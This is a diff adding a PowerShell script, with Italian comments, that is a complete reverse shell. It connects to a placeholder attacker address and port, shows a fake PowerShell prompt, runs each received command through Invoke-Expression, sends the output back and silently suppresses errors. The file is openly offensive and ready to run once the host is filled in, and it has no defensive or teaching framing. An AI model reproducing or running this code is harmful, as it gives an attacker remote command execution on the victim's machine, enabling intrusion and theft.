@@ -1,0 +1,57 @@
+$LHOST= "[ATTACKER-IP]"; 
+$LPORT= [ATTACKER-PORT]; 
+$TCPClient= New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
+$NetworkStream= $TCPClient.GetStream(); 
+$StreamWriter= New-Object IO.StreamWriter($NetworkStream); 
+$StreamWriter.AutoFlush= $true; 
+$Buffer= New-Object System.Byte[] 65536; 
+$Code= "";
+$promptSent= $false;
+
+while ($TCPClient.Connected) { 
+    try {
+        # Invia prompt ALLA FINE dell'output precedente (o all'inizio)
+        if (-not $promptSent) {
+            $prompt= "PS $((Get-Location).Path)> ";
+            $promptBytes= [text.encoding]::UTF8.GetBytes($prompt);
+            $NetworkStream.Write($promptBytes, 0, $promptBytes.Length);
+            $promptSent= $true;
+        }
+        
+        $pos= 0;
+        $RawData= $NetworkStream.Read($Buffer, $pos, $Buffer.Length - $pos);
+        if ($RawData -eq 0) { continue }
+        $pos += $RawData;
+        
+        while ($NetworkStream.DataAvailable -and $pos -lt $Buffer.Length - 1) {
+            $RawData= $NetworkStream.Read($Buffer, $pos, $Buffer.Length - $pos);
+            if ($RawData -eq 0) { break }
+            $pos += $RawData;
+        }
+        
+        if ($pos -gt 0) {
+            $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $pos).Trim();
+            
+            if ($Code.Length -gt 0 -and $Code -ne "") {
+                $promptSent= $false;  # Resetta per prossimo prompt dopo output
+                
+                $Output= try { 
+                    Invoke-Expression $Code 2>&1 | Out-String
+                } catch { 
+                    "ERRORE: $($_.Exception.Message)`n"
+                }; 
+                
+                if ($Output -and $Output.Trim() -ne "") {
+                    $Output= $Output.TrimEnd();
+                    $sendBytes= [text.encoding]::UTF8.GetBytes("$Output`n");
+                    $NetworkStream.Write($sendBytes, 0, $sendBytes.Length);
+                }
+            }
+        }
+    } catch {
+        # Silenzioso
+    }
+    Start-Sleep -Milliseconds 50;
+}
+
+$TCPClient.Close(); $NetworkStream.Close(); $StreamWriter.Close()
